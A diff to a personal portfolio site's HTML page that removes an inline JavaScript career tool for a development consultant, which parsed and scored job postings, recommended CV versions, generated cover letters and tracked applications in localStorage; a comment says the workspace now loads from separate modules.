-    badge.style.color = 'var(--gold)';
-    badge.style.background = 'rgba(255,215,0,.08)';
-    document.documentElement.dataset.persona = persona;
-  }
-})();
-
-/* ================================================================
-   CREDENTIALS DATABASE (inline fallback + fetch)
-   ================================================================ */
-const CREDENTIALS_FALLBACK = {
-  "profile": {
-    "name": "Alvin M. Silva, MDM",
-    "title": "Development Management Professional & Resilience Consultant",
-    "email": "alvin.silva@asilvainnovations.com",
-    "phone": "+63 917 855 5134",
-    "degrees": ["MDM — Master in Development Management, Asian Institute of Management"],
-    "certifications": ["Certified SRMP", "Certified International Humanitarian Practitioner", "Certified DRR Practitioner"],
-    "years_total": 18, "countries": 15, "funding_designed": "190M", "households_reached": "50000+",
-    "completion_rate": "100%", "strategic_plans_facilitated": 20, "frameworks_published": 10,
-    "university_collaborations": 5, "books_published": 3
-  },
-  "institutions": ["UNICEF","UNDP","ECHO","USAID","World Bank","WHO","TESDA","MMDA","DOH","BARMM Bureau of Investments-MTIT","Action Against Hunger","Asian Institute of Management","SOLHUM","Philippine Red Cross","German Red Cross","DLSU"],
-  "disciplines": [
-    {"name":"Climate Change Adaptation","years":15,"keywords":["CCA","climate","adaptation","ECHO","USAID","World Bank","bankable","funder-ready","PSF","climate-smart"],"projects":["Balatan Climate Resilience Hub"],"cv":"Alvin_Silva_CCA-DRR_CV.pdf"},
-    {"name":"Disaster Risk Reduction","years":15,"keywords":["DRR","disaster","risk","RA 10121","barangay","Bangsamoro","certified","UNDRR","ISO 31000"],"projects":["DDRiVE-M","IRRM BARMM","CONSENT DRR Review","Risk-Informed CDP Salcedo"],"cv":"Alvin_Silva_CCA-DRR_CV.pdf"},
-    {"name":"Systems Innovation","years":10,"keywords":["AI","platform","digital","PWA","dashboard","innovation","technology","app"],"projects":["DDRiVE-M","Strat Planner Pro","Cognitio+"],"cv":"Alvin_Silva_Development-Management_CV.pdf"},
-    {"name":"Organizational Development","years":12,"keywords":["performance","effectiveness","adoption","governance","organizational","OD","institutional"],"projects":["DLSU Performance Management","BDA Strategic Directions Strengthening"],"cv":"Alvin_Silva_Development-Management_CV.pdf"},
-    {"name":"Strategic Thinking & Planning","years":18,"keywords":["strategic","planning","roadmap","decade-scale","national","sole-authored","vision","mission"],"projects":["BIRD 2026-2035","TESDA Strategic Plan 2026-2030","BDA Strategic Directions"],"cv":"Alvin_Silva_Strategic-Thinking-Planning_CV.pdf"},
-    {"name":"Capacity Building","years":15,"keywords":["facilitator","training","executive","frontline","MDM","capacity","building","workshop"],"projects":["MHPSS Intervention Module","RTL - Real-Time Leadership"],"cv":"Alvin_Silva_Capacity-Building-Training_CV.pdf"},
-    {"name":"Security Risk Management","years":10,"keywords":["SRMP","security","risk","humanitarian","emergency","complex","operations"],"projects":["IRRM BARMM"],"cv":"Alvin_Silva_Development-Management_CV.pdf"}
-  ],
-  "projects": [
-    {"name":"BIRD 2026-2035","sector":"government","keywords":["investment roadmap","Bangsamoro","decade-long","BoI-MTIT","BARMM","strategic"]},
-    {"name":"DDRiVE-M Platform","sector":"private","keywords":["AI","DRR","RA 10121","ISO 31000","UNDRR","platform","digital"]},
-    {"name":"Strat Planner Pro","sector":"private","keywords":["AI","PWA","planning","execution","strategy","diagnosis"]},
-    {"name":"Balatan Climate Resilience Hub","sector":"government","keywords":["PSF","climate-smart","community-based","Camarines Sur","SOLHUM","coastal"]},
-    {"name":"TESDA Strategic Plan 2026-2030","sector":"government","keywords":["national","sole-authored","WorldSkills","quality engine","TVET"]},
-    {"name":"Risk-Informed CDP Salcedo","sector":"government","keywords":["CDP","CCA","DRR","Eastern Samar","comprehensive development plan","LGU"]},
-    {"name":"MHPSS Intervention Module","sector":"humanitarian","keywords":["WHO","DOH","mental health","PEMAT","emergency","psychosocial"]},
-    {"name":"IRRM BARMM","sector":"humanitarian","keywords":["USAID","Action Against Hunger","food security","livelihoods","WASH","Bangsamoro"]},
-    {"name":"DLSU Performance Management","sector":"private","keywords":["performance","metrics","organizational effectiveness","university","baseline"]},
-    {"name":"Urban Resilience Policy Review","sector":"government","keywords":["MMDA","policy","Metro Manila","governance","resilience"]}
-  ],
-  "publications": [
-    {"title":"Personal Resilience: The Path to Oneness","year":2025,"type":"book"},
-    {"title":"Resilient Futures: Nurturing Oneness in Education","year":2024,"type":"book"},
-    {"title":"Building Resilience: The Path to a More Fulfilling Life","year":2023,"type":"book"},
-    {"title":"Shock-Responsive & Sustainable Livelihoods Process Manual","year":2022,"type":"manual"}
-  ],
-  "cv_versions": [
-    {"file":"Alvin_Silva_CCA-DRR_CV.pdf","disciplines":["Climate Change Adaptation","Disaster Risk Reduction"],"keywords":["CCA","DRR","climate","resilience"],"sector_focus":"government"},
-    {"file":"Alvin_Silva_Capacity-Building-Training_CV.pdf","disciplines":["Capacity Building"],"keywords":["training","facilitator","capacity"],"sector_focus":"humanitarian"},
-    {"file":"Alvin_Silva_Development-Management_CV.pdf","disciplines":["Strategic Thinking & Planning","Organizational Development","Systems Innovation"],"keywords":["development","management","planning","organizational"],"sector_focus":"private"},
-    {"file":"Alvin_Silva_MEL_CV.pdf","disciplines":["Strategic Thinking & Planning"],"keywords":["M&E","monitoring","evaluation"],"sector_focus":"government"},
-    {"file":"Alvin_Silva_PPP_CV.pdf","disciplines":["Organizational Development","Strategic Thinking & Planning"],"keywords":["public-private","partnership"],"sector_focus":"private"},
-    {"file":"Alvin_Silva_Political-Economy-Analysis_CV.pdf","disciplines":["Strategic Thinking & Planning","Organizational Development"],"keywords":["policy","political economy","analysis"],"sector_focus":"government"},
-    {"file":"Alvin_Silva_Project-Evaluation_CV.pdf","disciplines":["Strategic Thinking & Planning"],"keywords":["evaluation","assessment","review"],"sector_focus":"government"},
-    {"file":"Alvin_Silva_Project-Management_CV.pdf","disciplines":["Strategic Thinking & Planning","Organizational Development"],"keywords":["project management","PM","delivery"],"sector_focus":"private"},
-    {"file":"Alvin_Silva_Research_CV.pdf","disciplines":["Strategic Thinking & Planning"],"keywords":["research","academic","publication"],"sector_focus":"academic"},
-    {"file":"Alvin_Silva_Strategic-Thinking-Planning_CV.pdf","disciplines":["Strategic Thinking & Planning"],"keywords":["strategic","planning","roadmap","BIRD"],"sector_focus":"government"}
-  ]
-};
-
-let CREDENTIALS = null;
-
-async function loadCredentials() {
-  try {
-    // BUG FIX (audit 2026-08-04): this previously pointed at
-    // 'assets/credentials.json', which does not exist — the canonical file
-    // lives at the repo root. That typo made this fetch 404 silently on
-    // every load, so the tool always ran on CREDENTIALS_FALLBACK below and
-    // never picked up live edits to credentials.json.
-    const res = await fetch('credentials.json');
-    if (res.ok) { CREDENTIALS = await res.json(); return; }
-  } catch (e) {}
-  CREDENTIALS = CREDENTIALS_FALLBACK;
-}
-
-/* ================================================================
-   TEXT EXTRACTION ENGINE (deterministic, regex-based)
-   ================================================================ */
-function extractJobDetails(text) {
-  const t = text.toLowerCase();
-  const lines = text.split('\n').map(l => l.trim()).filter(l => l.length > 0);
-
-  let organization = '';
-  const orgMatch = text.match(/(?:at|with|for|organization|company|institution)[\s:]+([^\n,]+)/i);
-  if (orgMatch) organization = orgMatch[1].trim();
-  else if (lines[0] && lines[0].length < 80 && !lines[0].includes('http')) organization = lines[0];
-
-  let role = '';
-  const rolePatterns = [
-    /(?:position|role|title|job)[\s:]+([^\n]+)/i,
-    /(?:seeking|hiring|looking for)[\s:]+([^\n]+)/i,
-    /^(senior|lead|chief|director|manager|advisor|specialist|consultant|officer|coordinator|analyst)[\s\w]+/im
-  ];
-  for (const p of rolePatterns) {
-    const m = text.match(p);
-    if (m) { role = m[1] ? m[1].trim() : m[0].trim(); break; }
-  }
-
-  const sectorKeywords = {
-    government: ['government','national','ministry','department','agency','bureau','municipal','provincial','policy','public sector','lgus'],
-    humanitarian: ['ngo','non-government','nonprofit','civil society','humanitarian','relief','development','community','advocacy','foundation'],
-    private: ['private sector','corporate','company','firm','enterprise','business','industry','consulting firm','startup'],
-    academic: ['university','college','academic','research','professor','lecturer','phd','doctoral','institute of technology']
-  };
-  let sector = 'government';
-  let maxSectorScore = 0;
-  for (const [s, keywords] of Object.entries(sectorKeywords)) {
-    const score = keywords.filter(k => t.includes(k)).length;
-    if (score > maxSectorScore) { maxSectorScore = score; sector = s; }
-  }
-
-  let location = '';
-  const locMatch = text.match(/(?:location|based in|based at|office|site)[\s:]+([^\n,]+)/i);
-  if (locMatch) location = locMatch[1].trim();
-  else {
-    const phMatch = text.match(/(manila|quezon city|makati|cebu|davao|baguio|iloilo|bacolod|zamboanga|calabarzon|bicol|visayas|mindanao|luzon)/i);
-    if (phMatch) location = phMatch[1];
-  }
-
-  let deadline = '';
-  const datePatterns = [
-    /(?:deadline|closing date|apply by|submit by)[\s:]+(\d{1,2}[\/\-\.]\d{1,2}[\/\-\.]\d{2,4}[^\n]*)/i,
-    /(?:deadline|closing date|apply by|submit by)[\s:]+([a-z]+ \d{1,2},? \d{4})/i,
-    /(\d{1,2}[\/\-\.]\d{1,2}[\/\-\.]\d{2,4})/
-  ];
-  for (const p of datePatterns) {
-    const m = text.match(p);
-    if (m) { deadline = m[1]; break; }
-  }
-
-  let requiredYears = 0;
-  const yearMatch = text.match(/(\d+)\+?\s*years?\s+(?:of\s+)?experience/i);
-  if (yearMatch) requiredYears = parseInt(yearMatch[1]);
-
-  const degreeKeywords = ['master','mdm','mba','mph','phd','doctorate','bachelor','bs','ba'];
-  const requiredDegrees = degreeKeywords.filter(d => t.includes(d));
-
-  const certKeywords = ['pmp','prince2','cpm','certified','license','registered'];
-  const requiredCerts = certKeywords.filter(c => t.includes(c));
-
-  const allWords = t.split(/[^\w\s]/).join(' ').split(/\s+/).filter(w => w.length > 3);
-  const wordFreq = {};
-  allWords.forEach(w => { wordFreq[w] = (wordFreq[w] || 0) + 1; });
-  const keywords = Object.entries(wordFreq).filter(([w, c]) => c > 1 || w.length > 6).map(([w]) => w).slice(0, 20);
-
-  return { organization, role, sector, location, deadline, requiredYears, requiredDegrees, requiredCerts, keywords, rawText: text };
-}
-
-/* ================================================================
-   SCORING ENGINE (deterministic, structured data only)
-   ================================================================ */
-function scoreOpportunity(job, creds) {
-  const profile = creds.profile;
-  const weights = {
-    credential: 0.20, experience: 0.20, project: 0.20, institutional: 0.10,
-    geographic: 0.10, publication: 0.05, urgency: 0.10, strategic: 0.05
-  };
-
-  let credScore = 50;
-  const hasMDM = job.requiredDegrees.some(d => d.includes('master') || d.includes('mdm'));
-  const hasCert = job.requiredCerts.length > 0;
-  if (hasMDM && profile.degrees.some(d => d.toLowerCase().includes('mdm'))) credScore = 100;
-  else if (job.requiredDegrees.length === 0) credScore = 75;
-  if (hasCert) {
-    const certMatch = job.requiredCerts.filter(c => profile.certifications.some(pc => pc.toLowerCase().includes(c)));
-    credScore = certMatch.length > 0 ? Math.min(100, credScore + 20) : Math.max(0, credScore - 30);
-  }
-
-  let expScore = 50;
-  if (job.requiredYears > 0) {
-    const relevantDiscipline = creds.disciplines.find(d => job.keywords.some(k => d.keywords.includes(k)));
-    const heldYears = relevantDiscipline ? relevantDiscipline.years : profile.years_total;
-    expScore = Math.min(100, Math.round((heldYears / job.requiredYears) * 100));
-  } else { expScore = 75; }
-
-  let projScore = 0;
-  const jobWords = new Set(job.keywords);
-  for (const project of creds.projects) {
-    const projWords = new Set(project.keywords.map(k => k.toLowerCase()));
-    const intersection = new Set([...jobWords].filter(w => projWords.has(w)));
-    const union = new Set([...jobWords, ...projWords]);
-    const score = union.size === 0 ? 0 : Math.round((intersection.size / union.size) * 100);
-    if (score > projScore) projScore = score;
-  }
-  if (projScore === 0) projScore = 25;
-
-  let instScore = 30;
-  const orgLower = job.organization.toLowerCase();
-  for (const inst of creds.institutions) {
-    if (orgLower.includes(inst.toLowerCase()) || inst.toLowerCase().includes(orgLower)) { instScore = 100; break; }
-  }
-  const persona = localStorage.getItem('as-persona') || 'government';
-  if (job.sector === persona) instScore = Math.min(100, instScore + 20);
-
-  let geoScore = 50;
-  const locLower = job.location.toLowerCase();
-  if (locLower.includes('philippines') || locLower.includes('manila') || locLower.includes('quezon')) geoScore = 100;
-  else if (locLower.includes('asia') || locLower.includes('pacific') || locLower.includes('africa')) geoScore = 80;
-  else if (job.location === '') geoScore = 60;
-  else geoScore = 40;
-
-  let pubScore = 50;
-  const pubKeywords = ['published','author','research','paper','book','framework'];
-  const wantsPub = pubKeywords.some(k => job.rawText.toLowerCase().includes(k));
-  if (wantsPub) pubScore = profile.books_published > 0 ? 100 : 60;
-
-  let urgencyScore = 75;
-  if (job.deadline) {
-    try {
-      const deadline = new Date(job.deadline);
-      const now = new Date();
-      const days = Math.ceil((deadline - now) / (1000 * 60 * 60 * 24));
-      if (days > 30) urgencyScore = 100;
-      else if (days > 14) urgencyScore = 85;
-      else if (days > 7) urgencyScore = 70;
-      else if (days > 0) urgencyScore = 50;
-      else urgencyScore = 0;
-    } catch (e) {}
-  }
-
-  let stratScore = 50;
-  const stratKeywords = ['chief','director','senior','lead','head','principal','advisor','architect','strategic','resilience','systems'];
-  const hasStrat = stratKeywords.some(k => job.role.toLowerCase().includes(k) || job.rawText.toLowerCase().includes(k));
-  if (hasStrat) stratScore = 100;
-  else if (job.role.toLowerCase().includes('manager') || job.role.toLowerCase().includes('consultant')) stratScore = 75;
-
-  const total = Math.round(
-    credScore * weights.credential + expScore * weights.experience +
-    projScore * weights.project + instScore * weights.institutional +
-    geoScore * weights.geographic + pubScore * weights.publication +
-    urgencyScore * weights.urgency + stratScore * weights.strategic
-  );
-
-  return {
-    total,
-    breakdown: { credential: credScore, experience: expScore, project: projScore, institutional: instScore, geographic: geoScore, publication: pubScore, urgency: urgencyScore, strategic: stratScore },
-    gaps: [
-      { type: credScore < 60 ? 'fail' : credScore < 80 ? 'warn' : 'ok', label: 'Credentials', detail: credScore < 60 ? 'Missing required degree/certification' : credScore < 80 ? 'Partial credential match' : 'All required credentials met' },
-      { type: expScore < 60 ? 'fail' : expScore < 80 ? 'warn' : 'ok', label: 'Experience', detail: expScore < 60 ? 'Requires ' + job.requiredYears + '+ years; gap detected' : 'Requires ' + job.requiredYears + '+ years; Alvin meets or exceeds' },
-      { type: projScore < 40 ? 'fail' : projScore < 60 ? 'warn' : 'ok', label: 'Project Alignment', detail: projScore < 40 ? 'Low keyword overlap with documented projects' : 'Strong project keyword overlap' },
-      { type: instScore < 50 ? 'warn' : 'ok', label: 'Institutional Fit', detail: instScore < 50 ? 'New institution type for Alvin' : 'Aligned with past institutional partners' }
-    ]
-  };
-}
-
-/* ================================================================
-   CV RECOMMENDATION ENGINE
-   ================================================================ */
-function recommendCV(job, creds) {
-  let bestMatch = null, bestScore = -1;
-  for (const cv of creds.cv_versions) {
-    const cvWords = new Set(cv.keywords);
-    const jobWords = new Set(job.keywords);
-    const intersection = new Set([...cvWords].filter(w => jobWords.has(w)));
-    const union = new Set([...cvWords, ...jobWords]);
-    const keywordScore = union.size === 0 ? 0 : intersection.size / union.size;
-    const sectorScore = cv.sector_focus === job.sector ? 1 : 0.5;
-    const discMatch = cv.disciplines.some(d => job.keywords.some(k => d.toLowerCase().includes(k)));
-    const discScore = discMatch ? 1 : 0.3;
-    const totalScore = keywordScore * 0.5 + sectorScore * 0.3 + discScore * 0.2;
-    if (totalScore > bestScore) { bestScore = totalScore; bestMatch = cv; }
-  }
-  return bestMatch || creds.cv_versions[0];
-}
-
-/* ================================================================
-   COVER LETTER GENERATOR
-   ================================================================ */
-function generateCoverLetter(job, creds, cv, score) {
-  const profile = creds.profile;
-  let bestProject = null, bestProjScore = -1;
-  for (const project of creds.projects) {
-    const projWords = new Set(project.keywords);
-    const jobWords = new Set(job.keywords);
-    const intersection = new Set([...jobWords].filter(w => projWords.has(w)));
-    const union = new Set([...jobWords, ...projWords]);
-    const s = union.size === 0 ? 0 : intersection.size / union.size;
-    if (s > bestProjScore) { bestProjScore = s; bestProject = project; }
-  }
-  let bestDiscipline = creds.disciplines[0], bestDiscScore = -1;
-  for (const disc of creds.disciplines) {
-    const match = disc.keywords.filter(k => job.keywords.includes(k)).length;
-    if (match > bestDiscScore) { bestDiscScore = match; bestDiscipline = disc; }
-  }
-  const org = job.organization || 'your organization';
-  const role = job.role || 'the position';
-  return `Dear Hiring Manager,\n\nI am writing to express my strong interest in the ${role} position at ${org}. With ${profile.years_total}+ years of professional experience in ${bestDiscipline.name.toLowerCase()} across ${profile.countries} countries — including ${profile.households_reached} households reached and ${profile.funding_designed} in climate-smart program funding designed and delivered — I bring a systems-level perspective grounded in measurable outcomes.\n\n${bestProject ? 'My leadership of ' + bestProject.name + ' — ' + bestProject.keywords.slice(0, 3).join(', ') + ' — directly demonstrates the competencies this role requires.' : 'My track record spans strategic planning, systems innovation, and institutional strengthening across government, NGO, and private sector contexts.'}\n\nKey credentials relevant to this position:\n• ${profile.degrees[0]}\n• ${profile.certifications.join('\n• ')}\n• ${profile.completion_rate} project completion rate with documented outcomes\n• ${profile.frameworks_published}+ published frameworks and intellectual property contributions\n• ${profile.strategic_plans_facilitated}+ strategic plans facilitated for governments, NGOs, and private sector\n\n${score.total >= 80 ? 'The alignment between this role and my documented experience is strong. I am prepared to discuss how my background can contribute to your objectives immediately.' : 'While there are specific areas where my profile diverges from the stated requirements, my transferable experience in complex, multi-stakeholder environments positions me to close those gaps rapidly.'}\n\nI would welcome the opportunity to discuss how my expertise in ${bestDiscipline.name.toLowerCase()} can support ${org}'s mission.\n\nSincerely,\n\nAlvin M. Silva, MDM\n${profile.email}\n${profile.phone}\nhttps://alvin-silva.asilvainnovations.com`;
-}
-
-/* ================================================================
-   UI RENDERERS
-   ================================================================ */
-function renderExtracted(job) {
-  const fields = [
-    { label: 'Organization', value: job.organization || '—' },
-    { label: 'Role', value: job.role || '—' },
-    { label: 'Sector', value: job.sector.charAt(0).toUpperCase() + job.sector.slice(1) },
-    { label: 'Location', value: job.location || '—' },
-    { label: 'Deadline', value: job.deadline || '—' },
-    { label: 'Experience Required', value: job.requiredYears > 0 ? job.requiredYears + '+ years' : '—' }
-  ];
-  // SECURITY FIX: f.value is derived from the pasted job posting (untrusted
-  // input) — escape before interpolating into innerHTML.
-  $('#extractedContent').innerHTML = fields.map(f => `
-    <div style="padding:.8rem;border-radius:10px;background:var(--pill-bg);border:1px solid var(--line)">
-      <div style="font-family:var(--font-cond);font-size:.68rem;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:var(--text-3);margin-bottom:.25rem">${escapeHtml(f.label)}</div>
-      <div style="font-weight:600;color:var(--text);font-size:.95rem">${escapeHtml(f.value)}</div>
-    </div>
-  `).join('');
-}
-
-function renderScoring(score) {
-  $('#totalScore').textContent = score.total;
-  const labels = { credential: 'Credential Match', experience: 'Experience Match', project: 'Project Alignment', institutional: 'Institutional Fit', geographic: 'Geographic Fit', publication: 'Publication Match', urgency: 'Deadline Urgency', strategic: 'Strategic Value' };
-  $('#scoreBreakdown').innerHTML = Object.entries(score.breakdown).map(([key, val]) => {
-    const cls = val >= 80 ? 'high' : val >= 50 ? 'medium' : 'low';
-    return `<div class="score-row"><div class="score-name">${labels[key]}</div><div class="score-bar"><div class="score-fill ${cls}" style="width:${val}%"></div></div><div class="score-num">${val}</div></div>`;
-  }).join('');
-  const verdictEl = $('#scoreVerdict');
-  if (score.total >= 90) { verdictEl.className = 'score-verdict pursue'; verdictEl.textContent = 'PURSUE — High alignment, strong credentials'; $('#scoreLabel').textContent = 'Excellent Match'; }
-  else if (score.total >= 70) { verdictEl.className = 'score-verdict conditional'; verdictEl.textContent = 'CONDITIONAL — Good match, minor gaps'; $('#scoreLabel').textContent = 'Good Match'; }
-  else if (score.total >= 50) { verdictEl.className = 'score-verdict conditional'; verdictEl.textContent = 'CONDITIONAL — Significant gaps, strategic value may justify'; $('#scoreLabel').textContent = 'Partial Match'; }
-  else { verdictEl.className = 'score-verdict skip'; verdictEl.textContent = 'SKIP — Misaligned or underqualified'; $('#scoreLabel').textContent = 'Low Match'; }
-  $('#gapAnalysis').innerHTML = score.gaps.map(g => {
-    const icon = g.type === 'ok' ? '✓' : g.type === 'warn' ? '!' : '✗';
-    const color = g.type === 'ok' ? 'var(--green)' : g.type === 'warn' ? 'var(--gold)' : 'var(--red)';
-    return `<div class="gap-item ${g.type}" style="color:${color}"><span style="font-weight:700">${icon}</span><div><strong>${g.label}:</strong> ${g.detail}</div></div>`;
-  }).join('');
-}
-
-function renderRecommendation(cv, letter) {
-  $('#cvRecommendation').innerHTML = `
-    <div class="cv-rec">
-      <div class="cv-rec-icon"><svg><use href="#i-file"/></svg></div>
-      <div class="cv-rec-info">
-        <div class="cv-rec-name">${cv.file}</div>
-        <div class="cv-rec-meta">${cv.disciplines.join(' · ')} · ${cv.sector_focus} sector focus</div>
-      </div>
-      <a href="Alvin_Silva_CV_Versions/${cv.file}" class="btn btn-primary btn-sm" download><svg><use href="#i-download"/></svg><span>Download</span></a>
-    </div>
-  `;
-  $('#coverLetter').textContent = letter;
-}
-
-/* ================================================================
-   TRACKER (localStorage)
-   ================================================================ */
-const TRACKER_KEY = 'as-career-tracker';
-function getTracker() { try { return JSON.parse(localStorage.getItem(TRACKER_KEY)) || []; } catch (e) { return []; } }
-function saveTracker(items) { try { localStorage.setItem(TRACKER_KEY, JSON.stringify(items)); } catch (e) {} renderTracker(); }
-
-function addToTracker(job, score, cv, letter) {
-  const items = getTracker();
-  items.unshift({ id: Date.now(), organization: job.organization || 'Unknown', role: job.role || 'Unknown', sector: job.sector, location: job.location, deadline: job.deadline, score: score.total, cv: cv.file, coverLetter: letter, status: 'New', dateAdded: new Date().toISOString().split('T')[0] });
-  saveTracker(items);
-}
-
-function renderTracker() {
-  const items = getTracker();
-  const container = $('#trackerContent');
-  if (items.length === 0) {
-    container.innerHTML = `<div class="tracker-empty"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M9 5H7a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2h-2M9 5a2 2 0 0 0 2 2h2a2 2 0 0 0 2-2M9 5a2 2 0 0 1 2-2h2a2 2 0 0 1 2 2m-3 7h3m-3 4h3m-6-4h.01M9 16h.01"/></svg><p>No opportunities tracked yet.<br>Paste a job posting above to get started.</p></div>`;
-    return;
-  }
-  const statuses = ['New','Analyzing','Applied','Interview','Offer','Rejected','Withdrawn','Ghosted'];
-  container.innerHTML = `
-    <table class="tracker-table">
-      <thead><tr><th>Organization</th><th>Role</th><th>Score</th><th>Deadline</th><th>Status</th><th>Added</th><th></th></tr></thead>
-      <tbody>
-        ${items.map(item => `
-          <tr>
-            <td><strong>${escapeHtml(item.organization)}</strong></td>
-            <td>${escapeHtml(item.role)}</td>
-            <td><span class="tracker-score ${item.score >= 80 ? 'high' : item.score >= 50 ? 'medium' : 'low'}">${item.score}</span></td>
-            <td>${escapeHtml(item.deadline) || '—'}</td>
-            <td><select class="tracker-status" onchange="updateStatus(${item.id}, this.value)">${statuses.map(s => `<option value="${s}" ${item.status === s ? 'selected' : ''}>${s}</option>`).join('')}</select></td>
-            <td>${item.dateAdded}</td>
-            <td><div class="tracker-actions"><button onclick="deleteItem(${item.id})" title="Delete" aria-label="Delete">🗑</button></div></td>
-          </tr>
-        `).join('')}
-      </tbody>
-    </table>
-  `;
-}
-window.updateStatus = function(id, status) { const items = getTracker(); const item = items.find(i => i.id === id); if (item) { item.status = status; saveTracker(items); } };
-window.deleteItem = function(id) { if (!confirm('Delete this opportunity?')) return; saveTracker(getTracker().filter(i => i.id !== id)); };
-
-function exportCSV() {
-  const items = getTracker();
-  if (items.length === 0) { alert('No opportunities to export.'); return; }
-  const headers = ['Organization','Role','Sector','Location','Deadline','Score','CV','Status','Date Added'];
-  const rows = items.map(i => [i.organization, i.role, i.sector, i.location, i.deadline, i.score, i.cv, i.status, i.dateAdded].map(v => '"' + (v || '').replace(/"/g, '""') + '"').join(','));
-  const csv = [headers.join(','), ...rows].join('\n');
-  const blob = new Blob([csv], { type: 'text/csv' });
-  const url = URL.createObjectURL(blob);
-  const a = document.createElement('a');
-  a.href = url; a.download = 'asilva-opportunities-' + new Date().toISOString().split('T')[0] + '.csv';
-  a.click(); URL.revokeObjectURL(url);
-}
-
-/* ================================================================
-   URL FETCHER
-   ================================================================ */
-async function fetchFromUrl() {
-  const url = $('#jobUrl').value.trim();
-  if (!url) { alert('Please enter a job posting URL.'); return; }
-  if (!url.startsWith('http')) { alert('Please enter a valid URL starting with http:// or https://'); return; }
-
-  const statusEl = $('#fetchStatus');
-  statusEl.style.display = 'block';
-  statusEl.textContent = 'Fetching job details...';
-  statusEl.style.color = 'var(--text-3)';
-
-  try {
-    // Attempt fetch with no-cors first (for sites that allow it)
-    const controller = new AbortController();
-    const timeout = setTimeout(() => controller.abort(), 8000);
-    const res = await fetch(url, { signal: controller.signal, headers: { 'Accept': 'text/html' } });
-    clearTimeout(timeout);
-
-    if (!res.ok) throw new Error('HTTP ' + res.status);
-    const html = await res.text();
-
-    // Extract text from HTML
-    const parser = new DOMParser();
-    const doc = parser.parseFromString(html, 'text/html');
-
-    // Try to find job description in common containers
-    const selectors = [
-      '[class*="job-description"]', '[class*="jobDescription"]',
-      '[class*="description"]', '[class*="posting"]',
-      'article', 'main', '[role="main"]',
-      '.content', '#content', '.details', '#details'
-    ];
-    let extractedText = '';
-    for (const sel of selectors) {
-      const el = doc.querySelector(sel);
-      if (el && el.textContent.length > 200) { extractedText = el.textContent; break; }
-    }
-    // Fallback: body text
-    if (!extractedText && doc.body) extractedText = doc.body.textContent;
-
-    // Clean up
-    extractedText = extractedText.replace(/\s+/g, ' ').replace(/\n\s*\n/g, '\n').trim();
-
-    if (extractedText.length < 100) {
-      statusEl.textContent = 'Fetched the page but could not extract job text. The content may load dynamically via JavaScript, or the page structure is unrecognized. Please paste the job text manually below.';
-      statusEl.style.color = 'var(--gold)';
-      return;
-    }
-
-    $('#jobInput').value = extractedText.substring(0, 8000); // Limit to 8K chars
-    statusEl.textContent = 'Successfully extracted job text. Click "Analyze Opportunity" to proceed.';
-    statusEl.style.color = 'var(--green)';
-
-  } catch (err) {
-    console.error('Fetch error:', err);
-    statusEl.textContent = 'Could not fetch from this URL. Possible reasons: (1) the site requires login, (2) content loads via JavaScript after page load, (3) CORS policy blocks the request, or (4) the URL redirects to a login wall. Please copy the job text and paste it manually below.';
-    statusEl.style.color = 'var(--gold)';
-  }
-}
-
-/* ================================================================
-   MAIN FLOW
-   ================================================================ */
-let currentJob = null, currentScore = null, currentCV = null, currentLetter = null;
-
-async function analyze() {
-  const text = $('#jobInput').value.trim();
-  if (!text) { alert('Please paste a job posting or fetch from URL first.'); return; }
-  if (!CREDENTIALS) await loadCredentials();
-  currentJob = extractJobDetails(text);
-  renderExtracted(currentJob);
-  currentScore = scoreOpportunity(currentJob, CREDENTIALS);
-  renderScoring(currentScore);
-  currentCV = recommendCV(currentJob, CREDENTIALS);
-  currentLetter = generateCoverLetter(currentJob, CREDENTIALS, currentCV, currentScore);
-  renderRecommendation(currentCV, currentLetter);
-  $('#results-section').style.display = '';
-  $('#results-section').scrollIntoView({ behavior: 'smooth', block: 'start' });
-}
-
-$('#fetchUrlBtn').addEventListener('click', fetchFromUrl);
-$('#analyzeBtn').addEventListener('click', analyze);
-$('#clearBtn').addEventListener('click', () => {
-  $('#jobUrl').value = '';
-  $('#jobInput').value = '';
-  $('#fetchStatus').style.display = 'none';
-  $('#results-section').style.display = 'none';
-  currentJob = null; currentScore = null; currentCV = null; currentLetter = null;
-});
-$('#copyLetterBtn').addEventListener('click', () => {
-  if (!currentLetter) return;
-  navigator.clipboard.writeText(currentLetter).then(() => alert('Cover letter copied to clipboard.'));
-});
-$('#saveTrackerBtn').addEventListener('click', () => {
-  if (!currentJob || !currentScore || !currentCV) return;
-  addToTracker(currentJob, currentScore, currentCV, currentLetter);
-  alert('Saved to tracker.');
-  $('#tracker-section').scrollIntoView({ behavior: 'smooth' });
-});
-$('#exportCsvBtn').addEventListener('click', exportCSV);
-$('#clearTrackerBtn').addEventListener('click', () => {
-  if (!confirm('Clear all tracked opportunities? This cannot be undone.')) return;
-  localStorage.removeItem(TRACKER_KEY);
-  renderTracker();
-});
-
-loadCredentials().then(() => renderTracker());
-
-// PWA (audit 2026-08-04): this page previously never registered the service
-// worker, so it had no offline support even though it's core to the
-// career-ops workflow. Registration is idempotent — if index.html/
-// portfolio.html already registered it in this browser this is a no-op.
-  })();
-</script>
-<script src="assets/js/career-intelligence.js"></script>
+<!-- The workspace is a registered platform module: boot.js loads
+     career-engine.js, career-store.js and career-workspace.js because this
+     page has a [data-asilva-career] mount. No other script tags. -->
 <script src="assets/js/boot.js" defer></script>
 </body>
 </html>
